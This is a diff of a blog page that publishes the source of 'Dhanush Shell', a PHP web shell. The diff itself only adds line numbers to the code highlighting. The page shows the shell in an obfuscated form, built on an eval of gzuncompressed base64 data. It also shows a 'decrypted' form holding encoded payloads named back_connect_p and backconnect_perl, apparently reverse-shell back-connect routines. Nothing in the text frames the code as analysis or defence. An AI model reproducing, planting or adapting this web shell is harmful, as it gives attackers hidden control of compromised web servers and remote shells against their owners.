@@ -16,7 +16,7 @@ Dhanush Shell. Coded By Arjun. An Indian Hacker.
 
 ### Dhanush Shell Source Code (encrypted)
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 //========================================//
 //========+++Dhanush+++==========//
 //========================================//
@@ -227,7 +227,7 @@ eval("?>".gzuncompress(base64_decode($bhart)));
 
 ### Dhanush Shell Source Code (decrypted)
 
-{% highlight php %}<?php
+{% highlight php linenos %}<?php
 $back_connect_p = "eNqlU01PwzAMvVfqfwjlkkpd94HEAZTDGENCCJC2cRrT1DUZCWvjqk5A/fcs3Rgg1gk0XxLnPT/bsnN60rZYthdKt4vKSNC+53sqL6A0BCuMCEK6EiYi4O52UZSQCkTHkoCGMMeKk/Llbdqd+V4dx4jShu7ee7PQ0TdCMQrDxTKxmTEqF2ANPe/U+LtUmSDdC98ja0NYOe1tTH3Qrde/md8+DCfR1h0/Du7m48lo2L8Pd7FxClqL1FDqqoxcWeE3FIXmNGBH2LMOfum1mu1aJtqibCY4vcs/Cg6AC06uKtIvX63+j+CxHe+pkLFxhUbkSi+BsU3eDQsw5rboUcdermergYZR5xDYPQT2DoFnn8OQIsvc4uw2NU6TLKPTwOokF0EUtJJgFu5r4wlFSRT/2UOznuJfOo2k+l+hdGnVmv4Bmanx6Q==";
 $backconnect_perl = "eNqlUl9rwjAQfxf8Drcqa4UWt1dLZU7rJmN2tNWXTUps45qtJiVNGf32S9pOcSAI3kNI7vcnd9z1boZlwYdbQoc55llZYFh4o1HA4m8s7G6n2+kXVSHwHmQ4oNfMLSpSXYL9if80dR7kuZYvpW110LzmJMPPiCYZVplup6hRI/CmL25owts8WizVRSWiIPTdyasJn1jknAm2rSjaY0MXca4PBtI/ZpTi+ChXbihJeESooSpZv99vTCAUiwgJ9pe72wykuv6+EVpjVAq2k62mRg2wHFMjCGeLpQna+LZhaSeQtwrNM5Dr+/+hnBMqQHOuiA+q2Qcj63zMUkRlI+cJlxhNWYITeKxgwr9KeonRda01Vs1aGRqOUwaW5ThBnSB0xxzHsmwo1fzBQjYoin3grQrMjyyS2KfwjHC5JYxXDZ7/tAQ4fpTiLFMoqHm1dbRrrhat53rzX0SL2FA=";
 $zone = "vVRtb9owEP6OxH+4ZhFKWkJg6roqEFS0VStaX1ChmybKB8c5wGpiZ7ZZS6vut8+Gjm5V1r18mPLBuedenrvznV9shQslw4TxsECZVSvVCpt6Wwe983cfxq2Jf1etFJJxDc6lNh+/5E77JyhHUFTq5e6c0CsYH0xgSeZCwDgVegJU5FDidCSuYSTgQmEElhZuBcdGkUFnyDRCxpTuQudCwlucEooSTkmO3e+B8IZpc9xXKy6RnyGGdbbNiQHdmVwUYoO1LEbnIi9grTGiKJB7pO50rLfjG+RAWdYYOqRrzTOh0CNW4SYGVZRkRHorIwtOhfRcEjfbLunEbmKOnR2/Wrl7oLFmY5dYYtPJjQjxVwg/iQVQwkGhLZJfKUjQhEOQWGRLH+5ALRKl5aNbHZp1eO1D7DhtuN80cbwzgYFQ2mTGU/ZIum7QQiH0z6JoKOgV6ijqnx6ObDXKyKagp6qgy/HaGyDKXppKiLvgPJ+oUwdrPRBSW+t9k+JACi1WrpoWjg9CAscbvbn2NbczOBuOIORCs+kyzIlS8BumpwF6lGKhI9gOty/lj3P1oD/HKUqU0b/FDY4Jny3IzI6lDhJZSvFGcI1cB6NlYexIUWSMEs0ED2+Cv2Q1oThS6xvBe8Qi6GXsC5ayml2RQW9miCM4Ebcsy0i422iCZ1asMPRJhm04GfYPYa/RbMNHxlNxreB0BK8aLb805JEZoD9plJshn+l5vD48J10vZbzeqFoqcsJ4K34+0GZEa/ahyEWKcWu/JpEoweO9mpn7nOl4iDxd5er/quvHqyQieEiqtLCBJLOcRMBFQAmdlze0FPwfpW2emBWnLVRl5u69l/b3/hs=";
